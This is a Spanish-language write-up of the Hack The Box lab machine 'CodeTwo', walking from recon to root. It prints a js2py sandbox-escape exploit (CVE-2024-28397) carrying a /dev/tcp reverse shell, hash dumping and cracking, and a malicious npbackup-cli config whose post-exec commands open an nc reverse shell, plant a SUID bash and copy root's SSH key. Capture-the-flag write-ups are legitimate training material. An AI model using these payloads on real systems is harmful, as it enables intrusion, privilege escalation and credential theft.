---
tags:
permalink: /CodeTwo-HTB-Writeup
title: CodeTwo - Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento


```bash 
nmap -sCV -p22,8000 10.129.232.59
```

# Service enumeration

## HTTP / Port 8000

Como vemos que en puerto `8000` corre un servicio web, necesitamos hacer que el la `ip` de la maquina resuelva correctamente al dominio de la misma, el cual es `codetwo.htb`, para eso lo agregamos al `/etc/hosts`.

```bash
sudo echo -e '10.129.232.59\t\codetwo.htb' | sudo tee -a /etc/hosts
```

Una vez hecho esto nos dirigimos a la pagina web.

![{B1755B53-AF65-4567-BBCF-70D43F2E2613}](images/{B1755B53-AF65-4567-BBCF-70D43F2E2613}.png)

Vemos varios botones, entre ellos, un botón de registro.

![{8C9EB303-D9A3-458B-AB20-70718ACF59C7}](images/{8C9EB303-D9A3-458B-AB20-70718ACF59C7}.png)

Asi que registramos al usuario con las siguientes credenciales:  `zs1n:zs1n123!$`.

Vemos que por el puerto `8000` corre un servicio `HTTP` con un editor de texto `Javascript`,

![{CCA0C471-F7EC-408F-9C1D-DD3F262A8C3E}](images/{CCA0C471-F7EC-408F-9C1D-DD3F262A8C3E}.png)

## Shell as marco 

Y tambien nos podemos descargar la `app` a nuestra maquina, lo cual nos viene bien para leer el codigo en busca de alguna vuln, asi que nos descargamos el codigo y lo analizamos.

### Analizing code from app

Viendo el codigo de `app.py`, vemos que importa `js2py` y una funcion la cual nos impide llamar a funciones globales de `python` ya que es python lo que corre por detras, y vemos que para impedir eso hace uso de `disable_pyimport()` , lo cual si buscamos maneras de bypassear estas restricciones del codigo nos encontramos con este [enlace](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py) del`CVE-2024-28397` el cual burla las restricciones para poder ejecutar comandos remotamente.

Para eso tenemos que ejecutar este payload en el edito de codigo `JavaScript`

```javascript 
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.17.19/4444 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

![{AF62D50B-2A4A-444B-A7F2-B97AD7ECBB59}](images/{AF62D50B-2A4A-444B-A7F2-B97AD7ECBB59}.png)

Le damos a `Run code`, y vemos que con exito

```bash
nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.59] 54714
bash: cannot set terminal process group (943): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ whoami
whoami
app
```

Una vez dentro de la shell como el usuario `app` hacemos un tratamiento de la `tty` para que esta no muera.

```bash 
script /dev/null -c bash 
Ctrl_Z
stty raw -echo; fg
reset xterm 
export TERM=xterm
export SHELL=bash 
```

Una vez hecho eso enumeramos los directorios y vemos que dentro de `home/app/app/instance` hay un archivos de base de datos el cual puede tener hashes del usuario `marco`

```
app@codeparttwo:~/app$ ls
app.py  instance  __pycache__  requirements.txt  static  templates
app@codeparttwo:~/app$ cd instance/
app@codeparttwo:~/app/instance$ ls
users.db
```

Podemos dumpear los datos usando `sqlite3`. Y es asi como vemos un hash del usuario `marco`.

```bash 
sqlite3 users.db .dump
```

```sql
app@codeparttwo:~/app/instance$ sqlite3 users.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'zs1n','7bff1677646c66d8d9c8256a864ebc5a');
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
COMMIT;
```

Este mismo hash lo colocamos dentro de un archivo al que vamos a llamar `hash`, y con `hashcat` intentamos romperlo.

```bash
 hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
[..snip..]

649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove  
```

Una vez tenemos las credenciales de `marco` ya estamos habilitados para su login via `ssh`

```bash 
ssh marco@codetwo.htb 
```

```bash
marco@codeparttwo:/home/app/app/instance$ cat /home/marco/user.txt 
5a4e367b73d86aa2b29f0f014e38c269
```
## Shell as root

### Enumeration

Ya una vez dentro de ssh como `marco`, podemos ver que estamos en el grupo `backups`.

```bash
marco@codeparttwo:/home/app/app/instance$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

Por lo que podemos buscar por `archivos`, `binarios`, o `scripts` de los cuales este grupo sea propietario.

```bash
marco@codeparttwo:/home/app/app/instance$ find / -group backups 2>/dev/null                                                                                                               
/opt                                                      
/opt/npbackup-cli
```

Vemos que al parecer tenemos privilegios en la carpeta `/opt/npbackup-cli`, pero vemos que la misma esta vacia.

```bash
marco@codeparttwo:/opt/npbackup-cli$ ls -la                                                                                                                                               
total 8                                                                                                                                                                                   
drwxr-x--- 2 root backups 4096 Apr  6  2025 .       
drwxr-xr-x 3 root backups 4096 Apr  5  2025 .. 
```

#### Sudoers privileges

Pero ademas tenemos el privilegio de ejeuctar el binario npbackup-cli como cualquier usuario, dentro de ellos `root`.

```bash
marco@codeparttwo:/opt/npbackup-cli$ sudo -l                                                                                                                                              
Matching Defaults entries for marco on codeparttwo:                                                                                                                                       
    env_reset, mail_badpass,                                                                                                                                                              
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                              
                                                                                                                                                                                          
User marco may run the following commands on codeparttwo:                                                                                                                                 
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

> `npbackup-cli` es una herramienta de línea de comandos (CLI) para el programa de copias de seguridad `npbackup` que permite a los usuarios, especialmente a los administradores de sistemas, crear y gestionar copias de seguridad de archivos de forma segura y eficiente.

Al parece este binario es de la familia de `restic`.

Si vemos que parámetros tiene el binario.

```bash 
sudo /usr/local/bin/npbackup-cli --help
```

Vemos que hay uno el cual me llama la atención el cual es `-c` el cual nos permite cargar la configuracion un archivo `.conf`  ejecutando asi el binario com  `root`, asi que mi plan es el siguiente.

- Crear un `.conf` el cual nos envie una `Reverse shell` a nuestra maquina, y por si las dudas tambien copiar la clave `id_rsa`, en caso de que la shell falle
- Abusar de dicho parámetro para que el binario se ejecute como `root` para escalar privilegios y ver la `root.txt`

Creamos el `.conf` como `zs1n.conf`, el cual va a tener el siguiente contenido:

```yaml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
        - /usr/bin
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: 
        - /root
      source_type: folder_list
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
        - excludes/generic_excluded_extensions
        - excludes/generic_excludes
        - excludes/windows_excludes
        - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: 
        - "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.17.19 1337 >/tmp/f"
        - "/bin/cp /bin/bash /tmp/rootbash; /bin/chmod +s /tmp/rootbash"
        - "mkdir -p /tmp/root/.ssh"
        - "chmod 666 /tmp/root/.ssh"
        - "cp /root/.ssh/id_rsa /tmp/root/.ssh/id_rsa"
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```

Y ejecutamos dicho comando para abusar del binario con privilegios. 

```bash 
sudo /usr/local/bin/npbackup-cli -c zs1n.conf  -b --force
```

Y con nuestro listener `nc` anteriormente seteado vemos que recibimos nuestra shell como `root` con exito, y asi ya podemos ver la flag.

```bash
sudo nc -nlvp 1337
[sudo] password for zsln: 
listening on [any] 1337 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.232.59] 50292
root@codeparttwo:/tmp# whoami
whoami
root
```

```bash
root@codeparttwo:/tmp# cat /root/root.txt
cat /root/root.txt
```

`~Happy Hacking.`